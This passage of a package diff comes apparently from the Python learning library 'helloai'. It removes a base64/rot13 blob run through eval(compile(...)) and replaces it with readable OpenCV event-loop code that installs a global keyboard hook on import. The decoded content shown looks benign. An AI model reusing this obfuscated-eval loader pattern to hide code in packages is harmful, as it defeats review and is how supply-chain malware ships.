J91p2IsMT93oy90nJ1yQDbtVPNtVPNtVTyzVTEcMzLtCPNjYwR6QDbtVPNtVPNtVPNtVPOyqzIhqS9hLJ1yVQ0tW2AfnJAeWj0XVPNtVPNtVPOyoUAyBt0XVPNtVPNtVPNtVPNtMKMyoaEsozSgMFN9VPWfMJM0YKIjVt0XVPNtVTIfnJLtMKMyoaDtCG0tL3LlYxIJEH5HK1WPIIEHG05RG1qBBt0XVPNtVPNtVPOyqzIhqS9hLJ1yVQ0tVaWcM2u0YJEiq24vQDbtVPNtMJkcMvOyqzIhqPN9CFOwqwVhEIMSGyEsHxWIISECGyIDBt0XVPNtVPNtVPOyqzIhqS9hLJ1yVQ0tVaWcM2u0YKIjVt0XVPNtVTIfnJLtMKMyoaDtCG0tL3LlYxIJEH5HK01CIIASGH9JEGbAPvNtVPNtVPNtMKMyoaEsozSgMFN9VPWgo3MyVt0XQDbtVPNtLaIcoUEcoaZhoJ91p2IsrPN9VUttQDbtVPNtLaIcoUEcoaZhoJ91p2IsrFN9VUxtQDbAPvNtVPOcMvObLKAuqUElXS9soJScoy9sYPNaoJ91p2IsMKMyoaDaXGbAPvNtVPNtVPNtnJLtMKMyoaEsozSgMFOcplOho3DtGz9hMGbAPvNtVPNtVPNtVPNtVS9soJScoy9sYz1iqKAyK2I2MJ50XT5uoJHfVTI2MJ50K25uoJHfVUtfVUxcQDbAPt0XMTIzVTEyoTS5XT1mXGbAPvNtVPNvVvVAPvNtVPOgp+djtPNj7W2865JZ64dHVBlIuBhfgB2PcPQfabKebXKgynQeyLjt6ezZ7XrNVBd4fBhYcBhziN0XVPNtVPVvVt0XVPNtVTyzVT1mVQ09VQN6QDbtVPNtVPNtVTyzVTky'
-god = 'bihidWlsdGlucy53aW5kb3dzKSA+IDA6DQogICAgICAgICAgICBjdjIud2FpdEtleSgwKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgdGltZS5zbGVlcCg2MCAqIDYwICogMTAwMCAvIDEwMDAuKSAgIyAxaHINCiAgICBlbHNlOiAgICANCiAgICAgICAgaWYgbGVuKGJ1aWx0aW5zLndpbmRvd3MpID4gMDoNCiAgICAgICAgICAgIGN2Mi53YWl0S2V5KGludChtcykpDQogICAgICAgIGVsc2U6ICAgIA0KICAgICAgICAgICAgdGltZS5zbGVlcChmbG9hdChtcykgLyAxMDAwLikNCiAgICAgICAgDQoNCg0KZGVmIHdhaXRfa2V5KG1zKToNCiAgICBwcmludCgnd2luZG93cyA6JywgbGVuKGJ1aWx0aW5zLndpbmRvd3MpKQ0KICAgIGlmIG1zID09IDA6DQogICAgICAgIGlmIGxlbihidWlsdGlucy53aW5kb3dzKSA+IDA6DQogICAgICAgICAgICBrZXkgPSBjdjIud2FpdEtleShtcykNCiAgICAgICAgICAgIGlmIGtleSA9PSAyNzoNCiAgICAgICAgICAgICAgICBieWUoKQ0KICAgICAgICAgICAgZWxzZTogICAgDQogICAgICAgICAgICAgICAgX19rZXlfcHJlc3NlZChjaHIoa2V5KSkNCiAgICAgICAgICAgIHJldHVybiBrZXkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGtleSA9IGlucHV0KCdwcmVzcyBhbnkga2V5IGFuZCBlbnRlcjogJykNCiAgICAgICAgICAgIF9fa2V5X3ByZXNzZWQoa2V5KQ0KICAgICAgICAgICAgcmV0dXJuIGtleQ0KICAgIGVsc2U6ICAgICAgICANCiAgICAgICAga2V5ID0gY3YyLndhaXRLZXkobXMpDQogICAgICAgIGlmIGtleSA9PSAyNzoNCiAgICAgICAgICAgIGJ5ZSgpDQogICAgICAgIGVsc2U6ICAgIA0KICAgICAgICAgICAgX19rZXlfcHJlc3NlZChjaHIoa2V5KSkNCiAgICAgICAgcmV0dXJuIGtleQ0KDQpkZWYgbm9sb29wKCk6DQogICAgZ2xvYmFsIG5vbG9vcF9mbGFnDQogICAgbm9sb29wX2ZsYWcgPSBUcnVlDQogICAgDQojIGh0dHBzOi8vcHlucHV0LnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdC9rZXlib2FyZC5odG1sI21vbml0b3JpbmctdGhlLWtleWJvYXJkDQojIGZvciBweW5wdXQNCiMgZGVmIG9uX3ByZXNzKGtleSk6DQojICAgICAjIHByaW50KCdbaGVsbG9haV0gb25fcHJlc3MnKQ0KIyAgICAgcGFzcw0KDQoNCiMgZm9yIHB5bnB1dA0KIyBkZWYgb25fcmVsZWFzZShrZXkpOg0KIyAgICAgaWYgb3MubmFtZSAhPSAncG9zaXgnOg0KIyAgICAgICAgIGlmIGtleSA9PSBrZXlib2FyZC5LZXkuZXNjOg0KIyAgICAgICAgICAgICAjIFN0b3AgbGlzdGVuZXINCiMgICAgICAgICAgICAgX19rZXlfcHJlc3NlZCgnZXNjJykNCiMgICAgICAgICAgICAgcmV0dXJuIEZhbHNlDQojICAgICAgICAgIyBfX2tleV9wcmVzc2VkKGtleV9zdHIpDQojICAgICAgICAgaWYgaGFzYXR0cihrZXksICdjaGFyJyk6DQojICAgICAgICAgICAgIF9fa2V5X3ByZXNzZWQoa2V5LmNoYXIpDQojICAgICAgICAgZWxzZToNCiMgICAgICAgICAgICAga3MgPSBrZXlfc3RyKGtleSkNCiMgICAgICAgICAgICAgX19rZXlfcHJlc3NlZChrcykNCg0KIyBrZXlib2FyZC5hZGRfaG90a2V5KCdlc2MnLCBsYW1iZGE6IGJ5ZSgpKQ0KDQpkZWYgcHJpbnRfcHJlc3NlZF9rZXlzKGUpOg0KICAgIGZvciBjb2RlIGluIGtleWJvYXJkLl9wcmVzc2VkX2V2ZW50czoNCiAgICAgICAgX19rZXlfcHJlc3NlZChlLm5hbWUpDQogICAgICAgIA0Ka2V5Ym9hcmQuaG9vayhwcmludF9wcmVzc2VkX2tleXMpDQoNCmRlZiBydW4oKToNCiAgICBnbG9iYWwgbG9vcF9mbGFnDQogICAgZ2xvYmFsIG5vbG9vcF9mbGFnDQogICAgZ2xvYmFsIHNldHVwX21ldGhvZA0KICAgIGdsb2JhbCBsb29wX21ldGhvZA0KICAgIA0KICAgIGdsb2JhbCBrZXlfcHJlc3NlZF9tZXRob2QNCiAgICBnbG9iYWwgY2FuY2VsX2Z1dHVyZV9jYWxscw0KDQogICAgaWYgaGFzYXR0cihfX21haW5fXywgJ3NldHVwJyk6DQogICAgICAgIHNldHVwX21ldGhvZCA9IF9fbWFpbl9fLnNldHVwDQogICAgZWxzZToNCiAgICAgICAgc2V0dXBfbWV0aG9kID0gc2V0dXANCg0KICAgIGlmIGhhc2F0dHIoX19tYWluX18sICdsb29wJyk6DQogICAgICAgIGxvb3BfbWV0aG9kID0gX19tYWluX18ubG9vcA0KICAgIGVsc2U6DQogICAgICAgIGxvb3BfbWV0aG9kID0gbG9vcA0KDQogICAgaWYgaGFzYXR0ci'
-destiny = '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'
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+import __main__
+import os
+import sys
+import builtins
+import time
+import math 
+# from threading import Event, Thread
+import cv2
+import keyboard
+
+from threading import Thread
+  
+from .singlestore import SingleStore
+from .colors import Color
+
+__all__ = ['loop', 'setup', 'run', 'wait_key', 'key_pressed', 'delay', 'frame_rate', 'size', 'noloop']
+
+KEY_TABLE = [
+    'nul', 'soh', 'stx', 'etx', 'eot', 'enq', 'ack', 'bel', 'bs', 'tab', 'lf', 'vt', 'ff', 'cr', 'so', 'si', 'dle',
+    'dc1', 'dc2', 'dc3', 'dc4', 'nak', 'syn', 'etb', 'can', 'em', 'sub', 'esc', 'fs', 'gs', 'rs', 'us', 'space', '!',
+    '"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
+    '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',
+    'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e',
+    'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'l', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|',
+    '}', '~', 'del'
+]
+
+
+loop_flag = True
+noloop_flag = False
+
+setup_method = None
+loop_method = None
+key_pressed_method = None
+mouse_event_method = None
+# cancel_future_calls = None
+mouse_down_time = time.time()
+
+loop_frame_rate = 60
+single_store = SingleStore()
+builtins.mouse_event = None
+
+# 전역 참조
+builtins.mouse_x = 0
+builtins.mouse_y = 0
+builtins.pmouse_x = 0
+builtins.pmouse_y = 0
+builtins.fps = 0
+
+builtins.mouse_pressed = False
+
+builtins.WIDTH = 640 
+builtins.HEIGHT = 480 
+builtins.COLOR = Color.DEFAULT
+
+builtins.windows = []
+
+prev_time = 0
+
+
+
+
+
+def __put_fps():
+    global prev_time
+
+    cur_time = time.time()
+    sec = cur_time - prev_time
+    prev_time = cur_time
+    fps_val = 1/(sec)
+    fps_val = round(fps_val)
+    builtins.fps = fps_val
+    # fps_txt = "%01.f" % fps_val
+    
+def bye():
+    global loop_flag
+    loop_flag = False
+    # delay(1)
+    # if len(builtins.windows) > 0:
+    #     builtins.windows = []
+    #     cv2.destroyAllWindows()
+    # print(builtins.windows)
+    # for name in builtins.windows:
+    #     cv2.destroyWindow(name)
+    builtins.windows = []
+    cv2.destroyAllWindows()
+    print('__bye__')
+    exit()
+
+
+def call_repeatedly(interval, func, *args):
+    stopped = Event()
+
+    def loop():
+        while not stopped.wait(interval):   # the first call is in `interval` secs
+            func(*args)
+    Thread(target=loop).start()
+    return stopped.set
+
+
+def size(width, height):
+    builtins.WIDTH = width 
+    builtins.HEIGHT = height 
+
+def setup():
+    pass
+
+
+def loop():
+    pass
+
+
+def key_pressed(key):
+    if key == 'esc' or key == 'q' or key == 'Q':
+        print('__key__', key)
+        bye()
+
+
+def __key_pressed(key):
+    # print('__key_pressed');
+    if key == 'esc' or key == 'q' or key == 'Q':
+        # 프로그램에서 종료 처리를 하도록 해준다
+        if key_pressed_method:
+            key_pressed_method(key)
+        bye()
+
+    else:
+        if key_pressed_method:
+            key_pressed_method(key)
+
+
+
+def mouse_event(name, event, x, y, flags=None, params=None):
+    global mouse_down_time
+    global mouse_x
+    global mouse_y
+
+    event_name = None
+    if event == cv2.EVENT_LBUTTONDOWN:
+        event_name = "left-down"
+        builtins.mouse_pressed = True
+        mouse_down_time = time.time()
+    elif event == cv2.EVENT_LBUTTONUP:
+        builtins.mouse_pressed = False
+        diff = time.time() - mouse_down_time
+        if diff < 0.1:
+            event_name = 'click'
+        else:
+            event_name = "left-up"
+    elif event == cv2.EVENT_RBUTTONDOWN:
+        event_name = "right-down"
+    elif event == cv2.EVENT_RBUTTONUP:
+        event_name = "right-up"
+    elif event == cv2.EVENT_MOUSEMOVE:
+        event_name = "move"
+
+    builtins.mouse_x = x 
+    builtins.mouse_y = y 
+
+    if hasattr(__main__, 'mouse_event'):
+        if event_name is not None:
+            __main__.mouse_event(name, event_name, x, y)
+
+
+def delay(ms):
+    """
+    ms가 0일때는 아무키 입력할때 까지 기다림
+    """
+    if ms == 0:
+        if len(builtins.windows) > 0:
+            cv2.waitKey(0)
+        else:
+            time.sleep(60 * 60 * 1000 / 1000.)  # 1hr
+    else:    
+        if len(builtins.windows) > 0:
+            cv2.waitKey(int(ms))
+        else:    
+            time.sleep(float(ms) / 1000.)
+        
+
+
+def wait_key(ms):
+    print('windows :', len(builtins.windows))
+    if ms == 0:
+        if len(builtins.windows) > 0:
+            key = cv2.waitKey(ms)
+            if key == 27:
+                bye()
+            else:    
+                __key_pressed(chr(key))
+            return key
+        else:
+            key = input('press any key and enter: ')
+            __key_pressed(key)
+            return key
+    else:        
+        key = cv2.waitKey(ms)
+        if key == 27:
+            bye()
+        else:    
+            __key_pressed(chr(key))
+        return key
+
+def noloop():
+    global noloop_flag
+    noloop_flag = True
+    
+# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
+# for pynput
+# def on_press(key):
+#     # print('[helloai] on_press')
+#     pass
+
+
+# for pynput
+# def on_release(key):
+#     if os.name != 'posix':
+#         if key == keyboard.Key.esc:
+#             # Stop listener
+#             __key_pressed('esc')
+#             return False
+#         # __key_pressed(key_str)
+#         if hasattr(key, 'char'):
+#             __key_pressed(key.char)
+#         else:
+#             ks = key_str(key)
+#             __key_pressed(ks)
+
+# keyboard.add_hotkey('esc', lambda: bye())
+
+def print_pressed_keys(e):
+    for code in keyboard._pressed_events:
+        __key_pressed(e.name)
+        
+keyboard.hook(print_pressed_keys)
+
+def run():
+    global loop_flag
+    global noloop_flag
+    global setup_method
+    global loop_method
+    
+    global key_pressed_method
+    global cancel_future_calls
+
+    if hasattr(__main__, 'setup'):
+        setup_method = __main__.setup
+    else:
+        setup_method = setup
+
+    if hasattr(__main__, 'loop'):
+        loop_method = __main__.loop
+    else:
+        loop_method = loop
+
+    if hasattr(__main__, 'key_pressed'):
+        key_pressed_method = __main__.key_pressed
+    else:
+        key_pressed_method = key_pressed
+
+    # if hasattr(__main__, 'mouse_event'):
+    #     mouse_event_method = __main__.mouse_event
+    # else:
+    #     mouse_event_method = mouse_event
+
+    # single_store.mouse_event = mouse_event_method
+    # single_store.mouse_event = mouse_event
+    builtins.mouse_event = mouse_event
+
+    # KeyBoard
+    # if os.name != 'posix':
+    #     listener = keyboard.Listener(
+    #         on_press=on_press,
+    #         on_release=on_release)
+    #     listener.start()
+
+    builtins.key_pressed = __key_pressed
+    
+    # 실행
+    setup_method()
+    while loop_flag:
+        try:
+            frame_exe_time = 1 / loop_frame_rate * 1000
+            start = time.time()
+
+            # pfs
+            __put_fps()
+            loop_method()
+            builtins.pmouse_x = builtins.mouse_x
+            builtins.pmouse_y = builtins.mouse_y
+            
+            delay(1)
+            # key = cv2.waitKey(1)
+            # print('Key.......', key)
+            # if key == 27:
+            #     bye()
+            # elif key != -1 and key != 0:
+            #     key_str = KEY_TABLE[key]
+            #     __key_pressed(key_str)
+            # delay(1)
+            run_time = time.time() - start
+            # print('loop_frame_rate ', loop_frame_rate)
+            # print('frame_exe_time', frame_exe_time)
+            # print('run_time ', run_time)
+            # print('delay time ', frame_exe_time - run_time)
+            delay_time = frame_exe_time - run_time
+            if delay_time > 0:
+                delay(delay_time)
+
+        except KeyboardInterrupt:
+            print('__bye__')
+            exit()
+
+        if noloop_flag:
+            loop_flag = False
+            # 동시에 끝나지 않고, 실행이 끝난 상태를 유지한다.
+            # wait_key(0)
+            exit()
+
+
+def frame_rate(value):
+    """
+    대략적인 프레임 속도를 지정한다.
+    """
+    global loop_frame_rate
+    loop_frame_rate = value
```

### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

## helloai/core/image.py

```diff
@@ -1,8 +1,1495 @@
-import base64, codecs
-magic = 'aW1wb3J0IGJ1aWx0aW5zCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHRpbWUKZnJvbSBQSUwgaW1wb3J0IEltYWdlIGFzIFBJbWFnZQpmcm9tIFBJTCBpbXBvcnQgSW1hZ2VEcmF3CmZyb20gUElMIGltcG9ydCBJbWFnZUZvbnQKZnJvbSBnbG9iIGltcG9ydCBnbG9iCmltcG9ydCBtYXRwbG90bGliLmltYWdlIGFzIGltZwppbXBvcnQgbWF0cGxvdGxpYi5weXBsb3QgYXMgcGx0CmltcG9ydCBjdjIKaW1wb3J0IGltdXRpbHMKaW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCBzY2lweS5zcGF0aWFsLmRpc3RhbmNlIGFzIHNwc2QKaW1wb3J0IG51bXB5IGFzIG5wCmltcG9ydCB1dWlkCgpmcm9tIGhlbGxvYWkuY29yZS5jb25maWcgaW1wb3J0ICoKZnJvbSBoZWxsb2FpLmNvcmUuY29sb3JzIGltcG9ydCBDb2xvcgoKCl9fYWxsX18gPSBbIkltYWdlIiwgIkNvbG9yU3BhY2UiLCAiSW1hZ2VTZXQiXQoKRk9OVF9QQVRIID0gIi4vYXNzZXRzL2ZvbnRzL2d1bGltLnR0YyIKCgpjbGFzcyBDb2xvclNwYWNlOgogICAgVU5LTk9XTiA9ICJ1bmtub3duIgogICAgQkdSID0gImJnciIKICAgIEdSQVkgPSAiZ3JheSIKICAgIFJHQiA9ICJyZ2IiCiAgICBITFMgPSAiaGxzIgogICAgSFNWID0gImhzdiIKICAgIFhZWiA9ICJ4eXoiCiAgICBZQ3JDYiA9ICJ5Y3JjYiIKICAgIEJHUkEgPSAiYmdyYSIKICAgIFJHQkEgPSAicmdiYSIKCgpjbGFzcyBJbWFnZToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBmcmFtZT1Ob25lLCBjb2xvcl9zcGFjZT1Db2xvclNwYWNlLkJHUik6CiAgICAgICAgaWYgaXNpbnN0YW5jZShmcmFtZSwgbnAubmRhcnJheSk6CiAgICAgICAgICAgIHNlbGYuX19maWxlbmFtZSA9IE5vbmUKICAgICAgICAgICAgc2VsZi5fX2ZyYW1lID0gZnJhbWUKICAgICAgICAgICAgc2VsZi5fX2ltYWdlID0gc2VsZi5fX2ZyYW1lCiAgICAgICAgICAgIHNlbGYuX19hcnJheSA9IHNlbGYuX19mcmFtZQogICAgICAgICAgICAjIHNoYXBlIChoLCB3LCBjKQogICAgICAgICAgICBzZWxmLl9faGVpZ2h0ID0gc2VsZi5fX2ZyYW1lLnNoYXBlWzBdCiAgICAgICAgICAgIHNlbGYuX193aWR0aCA9IHNlbGYuX19mcmFtZS5zaGFwZVsxXQogICAgICAgICAgICBzZWxmLl9fY29sb3JTcGFjZSA9IGNvbG9yX3NwYWNlCiAgICAgICAgICAgIGlmIGxlbihzZWxmLl9fZnJhbWUuc2hhcGUpID09IDM6CiAgICAgICAgICAgICAgICBoLCB3LCBjID0gc2VsZi5fX2ZyYW1lLnNoYXBlCiAgICAgICAgICAgICAgICBpZiBjID09IDQ6CiAgICAgICAgICAgICAgICAgICAgc2VsZi5fX2NvbG9yU3BhY2UgPSBDb2xvclNwYWNlLkJHUkEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHNlbGYuX19jb2xvclNwYWNlID0gQ29sb3JTcGFjZS5HUkFZCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCLtjIzrnbzrqZTthLDsnZgg7ZiV7J20IOunnuyngOyViuyKteuLiOuLpCIpCgogICAgQHByb3BlcnR5CiAgICBkZWYgd2lkdGgoc2VsZik6CiAgICAgICAgaWYgc2VsZi5pbWFnZSBpcyBub3QgTm9uZToKICAgICAgICAgICAgcmV0dXJuIHNlbGYuX19mcmFtZS5zaGFwZVsxXQogICAgICAgIHJldHVybiAtMQoKICAgIEBwcm9wZXJ0eQogICAgZGVmIGhlaWdodChzZWxmKToKICAgICAgICBpZiBzZWxmLl9fZnJhbWUgaXMgbm90IE5vbmU6CiAgICAgICAgICAgIHJldHVybiBzZWxmLl9fZnJhbWUuc2hhcGVbMF0KICAgICAgICByZXR1cm4gLTEKCiAgICBAcHJvcGVydHkKICAgIGRlZiBjZW50ZXIoc2VsZik6CiAgICAgICAgIiIi7J2066+47KeA7J2YIOykkeyLrCDsoozro4wKCiAgICAgICAgUmV0dXJuczoKICAgICAgICAgICAgdHVycGxlOiDsooztkZwgKHgsIHkpCiAgICAgICAgIiIiCiAgICAgICAgcmV0dXJuIChzZWxmLl9fd2lkdGggLy8gMiwgc2VsZi5fX2hlaWdodCAvLyAyKQoKICAgIEBwcm9wZXJ0eQogICAgZGVmIGltYWdlKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLl9fZnJhbWUKCiAgICBAcHJvcGVydHkKICAgIGRlZiBmcmFtZShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5fX2ZyYW1lCgogICAgQHByb3BlcnR5CiAgICBkZWYgbGlzdChzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5mcmFtZQoKICAgIEBwcm9wZXJ0eQogICAgZGVmIGFycmF5KHNlbGYpOgogICAgICAgIHJldHVybiBucC5hcnJheShzZWxmLl9fZnJhbWUpCgogICAgZGVmIHRvX2FycmF5KHNlbGYpOgogICAgICAgIHJldHVybiBucC5hcnJheShzZWxmLl9fZnJhbWUpCgogICAgQHByb3BlcnR5CiAgICBkZWYgbnBhcnJheShzZWxmKToKICAgICAgICByZXR1cm4gbnAuYXJyYXkoc2VsZi5fX2ZyYW1lKQoKICAgIGRlZiB0b19ucGFycmF5KHNlbGYpOgogICAgICAgIHJldHVybiBucC5hcnJheShzZWxmLl9fZnJhbWUpCgogICAgIyBzZXR0ZXLrs7Tri6Qg66i87KCAIOqwmeydgCDsnbTrpoTsnZggZ2V0dGVy7KCV7J2Y6rCAIO2VhOyalAogICAgIyDsnbQgc2V0dGVy6rCAIOyXhuycvOuptCDsnb3quLAg7KCE7Jqp7J20IOuQnOuLpC4KICAgICMgQG5hbWUuc2V0dGVyCiAgICAjIGRlZiBuYW1lKHNlbGYsIGZyYW1lKToKICAgICMgICAgIHNlbGYuX19mcmFtZSA9IG5hbWUKCiAgICBAcHJvcGVydHkKICAgIGRlZiBzaGFwZShzZWxmKToKICAgICAgICAiIiIKICAgICAgICAoaGVpZ2h0LCB3ZWlnaHQsIGNoYW5uZWwpCiAgICAgICAgIiIiCiAgICAgICAgcmV0dXJuIHNlbGYuX19mcmFtZS5zaGFwZQoKICAgIEBwcm9wZXJ0eQogICAgZGVmIGRpbWVuc2lvbihzZWxmKToKICAgICAgICAiIiIKICAgICAgICDssKjsm5DsiJgKICAgICAgICAiIiIKICAgICAgICByZXR1cm4gc2VsZi5fX2ZyYW1lLm5kaW0KCiAgICBAcHJvcGVydHkKICAgIGRlZiBzaXplKHNlbGYpOgogICAgICAgICIiIgogICAgICAgICh3aWR0aCwgaGVpZ2h0KQogICAgICAgICIiIgogICAgICAgIGlmIHNlbGYuX19mcmFtZSBpcyBub3QgTm9uZToKICAgICAgICAgICAgcmV0dXJuIChzZWxmLl9fZnJhbWUuc2hhcGVbMV0sIHNlbGYuX19mcmFtZS5zaGFwZVswXSkKCiAgICBAcHJvcGVydHkKICAgIGRlZiBjb2xvcnNwYWNlKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLl9fY29sb3JTcGFjZQoKICAgIEBwcm9wZXJ0eQogICAgZGVmIHBpeGVscyhzZWxmKToKICAgICAgICBpZiBzZWxmLl9fZnJhbWUgaXMgbm90IE5vbmU6CiAgICAgICAgICAgICMgcmV0dXJuIHNlbGYuX19mcmFtZS50b2xpc3QoKQogICAgICAgICAgICByZXR1cm4gc2VsZi5fX2ZyYW1lLnRvbGlzdCgpCiAgICAgICAgcmV0dXJuIG5wLmFycmF5KFtdKQoKICAgIEBwcm9wZXJ0eQogICAgZGVmIGZpbGVuYW1lKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLl9fZmlsZW5hbWUKCiAgICAjIGRlZiBfX2VxX18oc2VsZiwgb3RoZXIpOgogICAgIyAgICAgJ3ggPT0geeulvCDsoJXsnZgnCiAgICAjICAgICBwcmludCgnX19lcV9fJywgb3RoZXIpCiAgICAjICAgICByZXR1cm4gVHJ1ZQoKICAgICMgZGVmIF9fbmVfXyhzZWxmLCBvdGhlcik6CiAgICAjICAgICAneCAhPSB566W8IOygleydmCcKICAgICMgICAgIHByaW50KCdfX25lX18nLCBvdGhlcikKCiAgICBkZWYgY29weShzZWxmKToKICAgICAgICByZXR1cm4gSW1hZ2UobnAuY29weShzZWxmLl9fZnJhbWUpLCBzZWxmLl9fY29sb3JTcGFjZSkKCiAgICBkZWYgc2V0X2ZpbGVuYW1lKHNlbG